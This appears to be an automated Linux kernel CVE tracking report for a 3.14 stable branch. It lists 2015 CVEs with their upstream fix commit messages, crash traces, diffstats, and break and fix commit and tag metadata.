 fs/xfs/xfs_attr_remote.c |    8 +++++---
 fs/xfs/xfs_da_btree.h    |    2 ++
 5 files changed, 42 insertions(+), 14 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-16
CVE: CVE-2015-0274
Break Date: 2013-05-20
Break Commit: e461fcb194172b3f709e0b478d2ac1bdac7ab9a3
Break Tag: 3.11
Linus Fix Date: 2014-05-06
Linus Commit: 8275cdd0e7ac550dcce2b3ef6d2fb3b808c1ae59
Linus Tag: 3.15
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-0275:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 0f2af21aae11972fa924374ddcf52e88347cf5a8
Author: Lukas Czerner <lczerner@redhat.com>
Date:   Fri Apr 3 00:09:13 2015 -0400

    ext4: allocate entire range in zero range
    
    Currently there is a bug in zero range code which causes zero range
    calls to only allocate block aligned portion of the range, while
    ignoring the rest in some cases.
    
    In some cases, namely if the end of the range is past i_size, we do
    attempt to preallocate the last nonaligned block. However this might
    cause kernel to BUG() in some carefully designed zero range requests
    on setups where page size > block size.
    
    Fix this problem by first preallocating the entire range, including
    the nonaligned edges and converting the written extents to unwritten
    in the next step. This approach will also give us the advantage of
    having the range to be as linearly contiguous as possible.
    
    Signed-off-by: Lukas Czerner <lczerner@redhat.com>
    Signed-off-by: Theodore Ts'o <tytso@mit.edu>

 fs/ext4/extents.c |   31 +++++++++++++++++++------------
 1 file changed, 19 insertions(+), 12 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-0275
Break Date: 2014-03-18
Break Commit: b8a8684502a0fc852afa0056c6bb2a9273f6fcc0
Break Tag: 3.15
Linus Fix Date: 2015-04-03
Linus Commit: 0f2af21aae11972fa924374ddcf52e88347cf5a8
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-1328:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-06-15
CVE: CVE-2015-1328
Break Date: -
Break Commit: local-2015-1328-break
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2015-1328-fix
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-1333:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.49.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0
Author: Colin Ian King <colin.king@canonical.com>
Date:   Mon Jul 27 15:23:43 2015 +0100

    KEYS: ensure we free the assoc array edit if edit is valid
    
    __key_link_end is not freeing the associated array edit structure
    and this leads to a 512 byte memory leak each time an identical
    existing key is added with add_key().
    
    The reason the add_key() system call returns okay is that
    key_create_or_update() calls __key_link_begin() before checking to see
    whether it can update a key directly rather than adding/replacing - which
    it turns out it can.  Thus __key_link() is not called through
    __key_instantiate_and_link() and __key_link_end() must cancel the edit.
    
    CVE-2015-1333
    
    Signed-off-by: Colin Ian King <colin.king@canonical.com>
    Signed-off-by: David Howells <dhowells@redhat.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/keys/keyring.c |    8 +++++---
 1 file changed, 5 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-1333
Break Date: 2013-10-30
Break Commit: 034faeb9ef390d58239e1dce748143f6b35a0d9b
Break Tag: 3.13
Linus Fix Date: 2015-07-28
Linus Commit: ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0
Linus Tag: 4.2
Stable Date: 2015-08-03
Stable Commit: c9cd9b18dac801040ada16562dc579d5ac366d75
Stable Tag: 3.14.49

CVE-2015-1339:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 2c5816b4beccc8ba709144539f6fdd764f8fa49c
Author: Miklos Szeredi <miklos@szeredi.hu>
Date:   Tue Nov 10 10:32:36 2015 +0100

    cuse: fix memory leak
    
    The problem is that fuse_dev_alloc() acquires an extra reference to cc.fc,
    and the original ref count is never dropped.
    
    Reported-by: Colin Ian King <colin.king@canonical.com>
    Signed-off-by: Miklos Szeredi <miklos@szeredi.hu>
    Fixes: cc080e9e9be1 ("fuse: introduce per-instance fuse_dev structure")
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/fuse/cuse.c |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2015-1339
Break Date: 2015-07-01
Break Commit: cc080e9e9be16ccf26135d366d7d2b65209f1d56
Break Tag: 4.2
Linus Fix Date: 2015-11-10
Linus Commit: 2c5816b4beccc8ba709144539f6fdd764f8fa49c
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-1420:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.44.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 161f873b89136eb1e69477c847d5a5033239d9ba
Author: Sasha Levin <sasha.levin@oracle.com>
Date:   Wed Jan 28 15:30:43 2015 -0500

    vfs: read file_handle only once in handle_to_path
    
    We used to read file_handle twice.  Once to get the amount of extra
    bytes, and once to fetch the entire structure.
    
    This may be problematic since we do size verifications only after the
    first read, so if the number of extra bytes changes in userspace between
    the first and second calls, we'll have an incoherent view of
    file_handle.
    
    Instead, read the constant size once, and copy that over to the final
    structure without having to re-read it again.
    
    Signed-off-by: Sasha Levin <sasha.levin@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/fhandle.c |    5 +++--
 1 file changed, 3 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-16
CVE: CVE-2015-1420
Break Date: 2011-03-15
Break Commit: becfd1f37544798cbdfd788f32c827160fab98c1
Break Tag: 2.6
Linus Fix Date: 2015-06-02
Linus Commit: 161f873b89136eb1e69477c847d5a5033239d9ba
Linus Tag: 4.1
Stable Date: 2015-06-06
Stable Commit: be647ca464ebd9e54bd142da8150b31492aa1878
Stable Tag: 3.14.44

CVE-2015-1421:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.34.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 600ddd6825543962fb807884169e57b580dba208
Author: Daniel Borkmann <dborkman@redhat.com>
Date:   Thu Jan 22 18:26:54 2015 +0100

    net: sctp: fix slab corruption from use after free on INIT collisions
    
    When hitting an INIT collision case during the 4WHS with AUTH enabled, as
    already described in detail in commit 1be9a950c646 ("net: sctp: inherit
    auth_capable on INIT collisions"), it can happen that we occasionally
    still remotely trigger the following panic on server side which seems to
    have been uncovered after the fix from commit 1be9a950c646 ...
    
    [  533.876389] BUG: unable to handle kernel paging request at 00000000ffffffff
    [  533.913657] IP: [<ffffffff811ac385>] __kmalloc+0x95/0x230
    [  533.940559] PGD 5030f2067 PUD 0
    [  533.957104] Oops: 0000 [#1] SMP
    [  533.974283] Modules linked in: sctp mlx4_en [...]
    [  534.939704] Call Trace:
    [  534.951833]  [<ffffffff81294e30>] ? crypto_init_shash_ops+0x60/0xf0
    [  534.984213]  [<ffffffff81294e30>] crypto_init_shash_ops+0x60/0xf0
    [  535.015025]  [<ffffffff8128c8ed>] __crypto_alloc_tfm+0x6d/0x170
    [  535.045661]  [<ffffffff8128d12c>] crypto_alloc_base+0x4c/0xb0
    [  535.074593]  [<ffffffff8160bd42>] ? _raw_spin_lock_bh+0x12/0x50
    [  535.105239]  [<ffffffffa0418c11>] sctp_inet_listen+0x161/0x1e0 [sctp]
    [  535.138606]  [<ffffffff814e43bd>] SyS_listen+0x9d/0xb0
    [  535.166848]  [<ffffffff816149a9>] system_call_fastpath+0x16/0x1b
    
    ... or depending on the the application, for example this one:
    
    [ 1370.026490] BUG: unable to handle kernel paging request at 00000000ffffffff
    [ 1370.026506] IP: [<ffffffff811ab455>] kmem_cache_alloc+0x75/0x1d0
    [ 1370.054568] PGD 633c94067 PUD 0
    [ 1370.070446] Oops: 0000 [#1] SMP
    [ 1370.085010] Modules linked in: sctp kvm_amd kvm [...]
    [ 1370.963431] Call Trace:
    [ 1370.974632]  [<ffffffff8120f7cf>] ? SyS_epoll_ctl+0x53f/0x960
    [ 1371.000863]  [<ffffffff8120f7cf>] SyS_epoll_ctl+0x53f/0x960
    [ 1371.027154]  [<ffffffff812100d3>] ? anon_inode_getfile+0xd3/0x170
    [ 1371.054679]  [<ffffffff811e3d67>] ? __alloc_fd+0xa7/0x130
    [ 1371.080183]  [<ffffffff816149a9>] system_call_fastpath+0x16/0x1b
    
    With slab debugging enabled, we can see that the poison has been overwritten:
    
    [  669.826368] BUG kmalloc-128 (Tainted: G        W     ): Poison overwritten
    [  669.826385] INFO: 0xffff880228b32e50-0xffff880228b32e50. First byte 0x6a instead of 0x6b
    [  669.826414] INFO: Allocated in sctp_auth_create_key+0x23/0x50 [sctp] age=3 cpu=0 pid=18494
    [  669.826424]  __slab_alloc+0x4bf/0x566
    [  669.826433]  __kmalloc+0x280/0x310
    [  669.826453]  sctp_auth_create_key+0x23/0x50 [sctp]
    [  669.826471]  sctp_auth_asoc_create_secret+0xcb/0x1e0 [sctp]
    [  669.826488]  sctp_auth_asoc_init_active_key+0x68/0xa0 [sctp]
    [  669.826505]  sctp_do_sm+0x29d/0x17c0 [sctp] [...]
    [  669.826629] INFO: Freed in kzfree+0x31/0x40 age=1 cpu=0 pid=18494
    [  669.826635]  __slab_free+0x39/0x2a8
    [  669.826643]  kfree+0x1d6/0x230
    [  669.826650]  kzfree+0x31/0x40
    [  669.826666]  sctp_auth_key_put+0x19/0x20 [sctp]
    [  669.826681]  sctp_assoc_update+0x1ee/0x2d0 [sctp]
    [  669.826695]  sctp_do_sm+0x674/0x17c0 [sctp]
    
    Since this only triggers in some collision-cases with AUTH, the problem at
    heart is that sctp_auth_key_put() on asoc->asoc_shared_key is called twice
    when having refcnt 1, once directly in sctp_assoc_update() and yet again
    from within sctp_auth_asoc_init_active_key() via sctp_assoc_update() on
    the already kzfree'd memory, which is also consistent with the observation
    of the poison decrease from 0x6b to 0x6a (note: the overwrite is detected
    at a later point in time when poison is checked on new allocation).
    
    Reference counting of auth keys revisited:
    
    Shared keys for AUTH chunks are being stored in endpoints and associations
    in endpoint_shared_keys list. On endpoint creation, a null key is being
    added; on association creation, all endpoint shared keys are being cached
    and thus cloned over to the association. struct sctp_shared_key only holds
    a pointer to the actual key bytes, that is, struct sctp_auth_bytes which
    keeps track of users internally through refcounting. Naturally, on assoc
    or enpoint destruction, sctp_shared_key are being destroyed directly and
    the reference on sctp_auth_bytes dropped.
    
    User space can add keys to either list via setsockopt(2) through struct
    sctp_authkey and by passing that to sctp_auth_set_key() which replaces or
    adds a new auth key. There, sctp_auth_create_key() creates a new sctp_auth_bytes
    with refcount 1 and in case of replacement drops the reference on the old
    sctp_auth_bytes. A key can be set active from user space through setsockopt()
    on the id via sctp_auth_set_active_key(), which iterates through either
    endpoint_shared_keys and in case of an assoc, invokes (one of various places)
    sctp_auth_asoc_init_active_key().
    
    sctp_auth_asoc_init_active_key() computes the actual secret from local's
    and peer's random, hmac and shared key parameters and returns a new key
    directly as sctp_auth_bytes, that is asoc->asoc_shared_key, plus drops
    the reference if there was a previous one. The secret, which where we
    eventually double drop the ref comes from sctp_auth_asoc_set_secret() with
    intitial refcount of 1, which also stays unchanged eventually in
    sctp_assoc_update(). This key is later being used for crypto layer to
    set the key for the hash in crypto_hash_setkey() from sctp_auth_calculate_hmac().
    
    To close the loop: asoc->asoc_shared_key is freshly allocated secret
    material and independant of the sctp_shared_key management keeping track
    of only shared keys in endpoints and assocs. Hence, also commit 4184b2a79a76
    ("net: sctp: fix memory leak in auth key management") is independant of
    this bug here since it concerns a different layer (though same structures
    being used eventually). asoc->asoc_shared_key is reference dropped correctly
    on assoc destruction in sctp_association_free() and when active keys are
    being replaced in sctp_auth_asoc_init_active_key(), it always has a refcount
    of 1. Hence, it's freed prematurely in sctp_assoc_update(). Simple fix is
    to remove that sctp_auth_key_put() from there which fixes these panics.
    
    Fixes: 730fc3d05cd4 ("[SCTP]: Implete SCTP-AUTH parameter processing")
    Signed-off-by: Daniel Borkmann <dborkman@redhat.com>
    Acked-by: Vlad Yasevich <vyasevich@gmail.com>
    Acked-by: Neil Horman <nhorman@tuxdriver.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/sctp/associola.c |    1 -
 1 file changed, 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-16
CVE: CVE-2015-1421
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-01-26
Linus Commit: 600ddd6825543962fb807884169e57b580dba208
Linus Tag: 3.19
Stable Date: 2015-02-26
Stable Commit: faf1368dedf9cc98ef35c9ec6d2677ff5e98b090
Stable Tag: 3.14.34

CVE-2015-1465:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.34.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit df4d92549f23e1c037e83323aff58a21b3de7fe0
Author: Hannes Frederic Sowa <hannes@stressinduktion.org>
Date:   Fri Jan 23 12:01:26 2015 +0100

    ipv4: try to cache dst_entries which would cause a redirect
    
    Not caching dst_entries which cause redirects could be exploited by hosts
    on the same subnet, causing a severe DoS attack. This effect aggravated
    since commit f88649721268999 ("ipv4: fix dst race in sk_dst_get()").
    
    Lookups causing redirects will be allocated with DST_NOCACHE set which
    will force dst_release to free them via RCU.  Unfortunately waiting for
    RCU grace period just takes too long, we can end up with >1M dst_entries
    waiting to be released and the system will run OOM. rcuos threads cannot
    catch up under high softirq load.
    
    Attaching the flag to emit a redirect later on to the specific skb allows
    us to cache those dst_entries thus reducing the pressure on allocation
    and deallocation.
    
    This issue was discovered by Marcelo Leitner.
    
    Cc: Julian Anastasov <ja@ssi.bg>
    Signed-off-by: Marcelo Leitner <mleitner@redhat.com>
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Signed-off-by: Julian Anastasov <ja@ssi.bg>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/ip.h      |   11 ++++++-----
 net/ipv4/ip_forward.c |    3 ++-
 net/ipv4/route.c      |    9 +++++----
 3 files changed, 13 insertions(+), 10 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-04-05
CVE: CVE-2015-1465
Break Date: 2014-06-25
Break Commit: f88649721268999bdff09777847080a52004f691
Break Tag: 3.16
Linus Fix Date: 2015-01-26
Linus Commit: df4d92549f23e1c037e83323aff58a21b3de7fe0
Linus Tag: 3.19
Stable Date: 2015-02-26
Stable Commit: ee6db0ad53c9805d31bd1b0b7c9ea901407dfc19
Stable Tag: 3.14.34

CVE-2015-1573:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit a2f18db0c68fec96631c10cad9384c196e9008ac
Author: Pablo Neira Ayuso <pablo@netfilter.org>
Date:   Sun Jan 4 15:14:22 2015 +0100

    netfilter: nf_tables: fix flush ruleset chain dependencies
    
    Jumping between chains doesn't mix well with flush ruleset. Rules
    from a different chain and set elements may still refer to us.
    
    [  353.373791] ------------[ cut here ]------------
    [  353.373845] kernel BUG at net/netfilter/nf_tables_api.c:1159!
    [  353.373896] invalid opcode: 0000 [#1] SMP
    [  353.373942] Modules linked in: intel_powerclamp uas iwldvm iwlwifi
    [  353.374017] CPU: 0 PID: 6445 Comm: 31c3.nft Not tainted 3.18.0 #98
    [  353.374069] Hardware name: LENOVO 5129CTO/5129CTO, BIOS 6QET47WW (1.17 ) 07/14/2010
    [...]
    [  353.375018] Call Trace:
    [  353.375046]  [<ffffffff81964c31>] ? nf_tables_commit+0x381/0x540
    [  353.375101]  [<ffffffff81949118>] nfnetlink_rcv+0x3d8/0x4b0
    [  353.375150]  [<ffffffff81943fc5>] netlink_unicast+0x105/0x1a0
    [  353.375200]  [<ffffffff8194438e>] netlink_sendmsg+0x32e/0x790
    [  353.375253]  [<ffffffff818f398e>] sock_sendmsg+0x8e/0xc0
    [  353.375300]  [<ffffffff818f36b9>] ? move_addr_to_kernel.part.20+0x19/0x70
    [  353.375357]  [<ffffffff818f44f9>] ? move_addr_to_kernel+0x19/0x30
    [  353.375410]  [<ffffffff819016d2>] ? verify_iovec+0x42/0xd0
    [  353.375459]  [<ffffffff818f3e10>] ___sys_sendmsg+0x3f0/0x400
    [  353.375510]  [<ffffffff810615fa>] ? native_sched_clock+0x2a/0x90
    [  353.375563]  [<ffffffff81176697>] ? acct_account_cputime+0x17/0x20
    [  353.375616]  [<ffffffff8110dc78>] ? account_user_time+0x88/0xa0
    [  353.375667]  [<ffffffff818f4bbd>] __sys_sendmsg+0x3d/0x80
    [  353.375719]  [<ffffffff81b184f4>] ? int_check_syscall_exit_work+0x34/0x3d
    [  353.375776]  [<ffffffff818f4c0d>] SyS_sendmsg+0xd/0x20
    [  353.375823]  [<ffffffff81b1826d>] system_call_fastpath+0x16/0x1b
    
    Release objects in this order: rules -> sets -> chains -> tables, to
    make sure no references to chains are held anymore.
    
    Reported-by: Asbjoern Sloth Toennesen <asbjorn@asbjorn.biz>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/netfilter/nf_tables_api.c |   14 +++++++++-----
 1 file changed, 9 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-1573
Break Date: 2014-09-09
Break Commit: b9ac12ef099707f405d7478009564302d7ed8393
Break Tag: 3.18
Linus Fix Date: 2015-01-06
Linus Commit: a2f18db0c68fec96631c10cad9384c196e9008ac
Linus Tag: 3.19
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-1593:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.35.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4e7c22d447bb6d7e37bfe39ff658486ae78e8d77
Author: Hector Marco-Gisbert <hecmargi@upv.es>
Date:   Sat Feb 14 09:33:50 2015 -0800

    x86, mm/ASLR: Fix stack randomization on 64-bit systems
    
    The issue is that the stack for processes is not properly randomized on
    64 bit architectures due to an integer overflow.
    
    The affected function is randomize_stack_top() in file
    "fs/binfmt_elf.c":
    
      static unsigned long randomize_stack_top(unsigned long stack_top)
      {
               unsigned int random_variable = 0;
    
               if ((current->flags & PF_RANDOMIZE) &&
                       !(current->personality & ADDR_NO_RANDOMIZE)) {
                       random_variable = get_random_int() & STACK_RND_MASK;
                       random_variable <<= PAGE_SHIFT;
               }
               return PAGE_ALIGN(stack_top) + random_variable;
               return PAGE_ALIGN(stack_top) - random_variable;
      }
    
    Note that, it declares the "random_variable" variable as "unsigned int".
    Since the result of the shifting operation between STACK_RND_MASK (which
    is 0x3fffff on x86_64, 22 bits) and PAGE_SHIFT (which is 12 on x86_64):
    
    	  random_variable <<= PAGE_SHIFT;
    
    then the two leftmost bits are dropped when storing the result in the
    "random_variable". This variable shall be at least 34 bits long to hold
    the (22+12) result.
    
    These two dropped bits have an impact on the entropy of process stack.
    Concretely, the total stack entropy is reduced by four: from 2^28 to
    2^30 (One fourth of expected entropy).
    
    This patch restores back the entropy by correcting the types involved
    in the operations in the functions randomize_stack_top() and
    stack_maxrandom_size().
    
    The successful fix can be tested with:
    
      $ for i in `seq 1 10`; do cat /proc/self/maps | grep stack; done
      7ffeda566000-7ffeda587000 rw-p 00000000 00:00 0                          [stack]
      7fff5a332000-7fff5a353000 rw-p 00000000 00:00 0                          [stack]
      7ffcdb7a1000-7ffcdb7c2000 rw-p 00000000 00:00 0                          [stack]
      7ffd5e2c4000-7ffd5e2e5000 rw-p 00000000 00:00 0                          [stack]
      ...
    
    Once corrected, the leading bytes should be between 7ffc and 7fff,
    rather than always being 7fff.
    
    Signed-off-by: Hector Marco-Gisbert <hecmargi@upv.es>
    Signed-off-by: Ismael Ripoll <iripoll@upv.es>
    [ Rebased, fixed 80 char bugs, cleaned up commit message, added test example and CVE ]
    Signed-off-by: Kees Cook <keescook@chromium.org>
    Cc: <stable@vger.kernel.org>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Andrew Morton <akpm@linux-foundation.org>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Fixes: CVE-2015-1593
    Link: http://lkml.kernel.org/r/20150214173350.GA18393@www.outflux.net
    Signed-off-by: Borislav Petkov <bp@suse.de>

 arch/x86/mm/mmap.c |    6 +++---
 fs/binfmt_elf.c    |    5 +++--
 2 files changed, 6 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-16
CVE: CVE-2015-1593
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-02-19
Linus Commit: 4e7c22d447bb6d7e37bfe39ff658486ae78e8d77
Linus Tag: 4.0
Stable Date: 2015-03-06
Stable Commit: 14a3e0c960668a161880301cb90f48f331117073
Stable Tag: 3.14.35

CVE-2015-1805:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 637b58c2887e5e57850865839cc75f59184b23d1
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Mon Feb 3 19:11:42 2014 -0500

    switch pipe_read() to copy_page_to_iter()
    
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/pipe.c |   79 +++++++------------------------------------------------------
 1 file changed, 8 insertions(+), 71 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-08
CVE: CVE-2015-1805
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-04-01
Linus Commit: 637b58c2887e5e57850865839cc75f59184b23d1
Linus Tag: 3.15
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-1805:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit f0d1bec9d58d4c038d0ac958c9af82be6eb18045
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Thu Apr 3 15:05:18 2014 -0400

    new helper: copy_page_from_iter()
    
    parallel to copy_page_to_iter().  pipe_write() switched to it (and became
    ->write_iter()).
    
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/pipe.c           |  129 ++++++++-------------------------------------------
 include/linux/uio.h |    2 +
 mm/iov_iter.c       |   78 +++++++++++++++++++++++++++++++
 3 files changed, 99 insertions(+), 110 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-08
CVE: CVE-2015-1805
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-05-06
Linus Commit: f0d1bec9d58d4c038d0ac958c9af82be6eb18045
Linus Tag: 3.16
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-2041:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.39.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6b8d9117ccb4f81b1244aafa7bc70ef8fa45fc49
Author: Sasha Levin <sasha.levin@oracle.com>
Date:   Fri Jan 23 20:47:00 2015 -0500

    net: llc: use correct size for sysctl timeout entries
    
    The timeout entries are sizeof(int) rather than sizeof(long), which
    means that when they were getting read we'd also leak kernel memory
    to userspace along with the timeout values.
    
    Signed-off-by: Sasha Levin <sasha.levin@oracle.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/llc/sysctl_net_llc.c |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-04-21
CVE: CVE-2015-2041
Break Date: 2005-09-22
Break Commit: 590232a7150674b2036291eaefce085f3f9659c8
Break Tag: 2.6
Linus Fix Date: 2015-01-25
Linus Commit: 6b8d9117ccb4f81b1244aafa7bc70ef8fa45fc49
Linus Tag: 3.19
Stable Date: 2015-04-19
Stable Commit: ecca64226ce2960280921e09ae33e90f82b5c408
Stable Tag: 3.14.39

CVE-2015-2042:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.39.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit db27ebb111e9f69efece08e4cb6a34ff980f8896
Author: Sasha Levin <sasha.levin@oracle.com>
Date:   Tue Feb 3 08:55:58 2015 -0500

    net: rds: use correct size for max unacked packets and bytes
    
    Max unacked packets/bytes is an int while sizeof(long) was used in the
    sysctl table.
    
    This means that when they were getting read we'd also leak kernel memory
    to userspace along with the timeout values.
    
    Signed-off-by: Sasha Levin <sasha.levin@oracle.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/rds/sysctl.c |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-04-21
CVE: CVE-2015-2042
Break Date: 2009-02-26
Break Commit: 3e5048495c8569bfdd552750e0315973c61e7c93
Break Tag: 2.6
Linus Fix Date: 2015-02-04
Linus Commit: db27ebb111e9f69efece08e4cb6a34ff980f8896
Linus Tag: 3.19
Stable Date: 2015-04-19
Stable Commit: 2a9eb844a4c126b7e975a086f99f35699e88c011
Stable Tag: 3.14.39

CVE-2015-2150:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.37.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit af6fc858a35b90e89ea7a7ee58e66628c55c776b
Author: Jan Beulich <JBeulich@suse.com>
Date:   Wed Mar 11 13:51:17 2015 +0000

    xen-pciback: limit guest control of command register
    
    Otherwise the guest can abuse that control to cause e.g. PCIe
    Unsupported Request responses by disabling memory and/or I/O decoding
    and subsequently causing (CPU side) accesses to the respective address
    ranges, which (depending on system configuration) may be fatal to the
    host.
    
    Note that to alter any of the bits collected together as
    PCI_COMMAND_GUEST permissive mode is now required to be enabled
    globally or on the specific device.
    
    This is CVE-2015-2150 / XSA-120.
    
    Signed-off-by: Jan Beulich <jbeulich@suse.com>
    Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: David Vrabel <david.vrabel@citrix.com>

 drivers/xen/xen-pciback/conf_space.c        |    2 +-
 drivers/xen/xen-pciback/conf_space.h        |    2 +
 drivers/xen/xen-pciback/conf_space_header.c |   61 +++++++++++++++++++++------
 3 files changed, 51 insertions(+), 14 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-03-12
CVE: CVE-2015-2150
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-03-11
Linus Commit: af6fc858a35b90e89ea7a7ee58e66628c55c776b
Linus Tag: 4.0
Stable Date: 2015-03-26
Stable Commit: 9cb8c24e612f1724fa85872205a1dfae7603d874
Stable Tag: 3.14.37

CVE-2015-2666:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.47.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f84598bd7c851f8b0bf8cd0d7c3be0d73c432ff4
Author: Quentin Casasnovas <quentin.casasnovas@oracle.com>
Date:   Tue Feb 3 13:00:22 2015 +0100

    x86/microcode/intel: Guard against stack overflow in the loader
    
    mc_saved_tmp is a static array allocated on the stack, we need to make
    sure mc_saved_count stays within its bounds, otherwise we're overflowing
    the stack in _save_mc(). A specially crafted microcode header could lead
    to a kernel crash or potentially kernel execution.
    
    Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>
    Cc: "H. Peter Anvin" <hpa@zytor.com>
    Cc: Fenghua Yu <fenghua.yu@intel.com>
    Link: http://lkml.kernel.org/r/1422964824-22056-1-git-send-email-quentin.casasnovas@oracle.com
    Signed-off-by: Borislav Petkov <bp@suse.de>

 arch/x86/kernel/cpu/microcode/intel_early.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
